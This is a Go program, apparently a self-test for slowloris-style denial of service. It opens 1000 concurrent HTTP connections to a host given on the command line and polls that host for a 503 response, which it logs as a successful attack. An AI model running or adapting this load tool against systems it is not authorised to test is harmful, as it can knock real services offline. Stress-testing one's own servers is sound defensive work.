package main

import (
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"
)

func dial(host string) {
	tr := &http.Transport{
		DisableKeepAlives: false, // ensure persistent connections
	}

	client := &http.Client{
		Transport: tr,
	}

	req, err := http.NewRequest("GET", host, nil)
	if err != nil {
		log.Println("error creating request:", err)

		return
	}

	// make the request
	resp, err := client.Do(req)
	if err != nil {
		log.Println("error making request:", err)

		return
	}

	defer resp.Body.Close()

	// read the response body
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Println("error reading response:", err)

		return
	}

	// print the response
	fmt.Println("Response Status:", resp.Status)
	fmt.Println("Response Body:", string(body))

	// keep the connection open by sleeping (for demonstration purposes)
	// you may handle this differently in your actual use case
	for {
		time.Sleep(10 * time.Second)
	}
}

func ping(target string) {
	targetURL := target

	// create an HTTP client
	client := http.Client{}

	// set up a ticker to ping the server at intervals
	interval := 5 * time.Second
	ticker := time.NewTicker(interval)

	for {
		select {
		case <-ticker.C:
			// make an HTTP GET request to the target URL
			resp, err := client.Get(targetURL)
			if err != nil {
				log.Println("error making request:", err)
				continue
			}

			defer resp.Body.Close()

			// check the response status code
			if resp.StatusCode == http.StatusServiceUnavailable {
				log.Printf("Server returned non-OK status code: %d\n", resp.StatusCode)
				log.Println("slowloris attack succeed, service is out of control")

				os.Exit(1)
			}

			fmt.Println("Server is healthy")
		}
	}
}

func main() {
	log.SetOutput(os.Stdout)

	var (
		hostFlag      = flag.String("host", "localhost", "target host address")
		endpointsFlag = flag.String("endpoints", "/", "target specific endpoints")
		paramsFlag    = flag.String("params", "", "system parameters for testing")
	)

	flag.Parse()

	endpoints := strings.Split(*endpointsFlag, ",")
	paramSet := strings.Split(*paramsFlag, "&")

	params := make(map[string]string)

	for _, item := range paramSet {
		parts := strings.Split(item, "=")
		params[parts[0]] = parts[1]
	}

	log.Println(*hostFlag)
	log.Println(endpoints)
	log.Println(params)

	wg := sync.WaitGroup{}

	// send live requests
	for i := 0; i < 1000; i++ {
		wg.Add(1)

		go func() {
			dial(*hostFlag)
			wg.Done()
		}()
	}

	// monitor
	go func() {
		ping(*hostFlag)
	}()

	wg.Wait()

	log.Println("safe against slowloris attack!")

	os.Exit(0)
}
